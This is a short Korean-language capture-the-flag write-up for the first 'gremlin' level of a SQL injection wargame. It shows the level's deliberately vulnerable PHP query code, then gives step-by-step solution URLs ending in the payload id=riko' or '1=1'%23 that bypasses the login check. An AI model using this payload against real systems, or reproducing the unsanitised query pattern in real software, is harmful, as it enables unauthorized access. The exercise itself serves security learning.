# Los.eagle-jump.org
* 1번 문제 [gremlin]
```javascript
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```
쿼리문
```
query : select id from prob_gremlin where id='' and pw=''
```


* Solution [쿼리를 이용해 로그인 시도]

1. 파라미터를 이용해 쿼리문을 작성
https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=

2. id=''안에 무엇이 들어가든 상관없습니다

3. https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=riko' or '1=1'#

4. or을 이용해여 참값을 반환, 코드를 주석으로 만들기 위해 뒤에 # 추가

5. 3번 URL을 그대로 입력시 로그인은 실패

6. URL decode을 이용하여 #을 변환 결과는 %23

7. 정답: https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=riko' or '1=1'%23
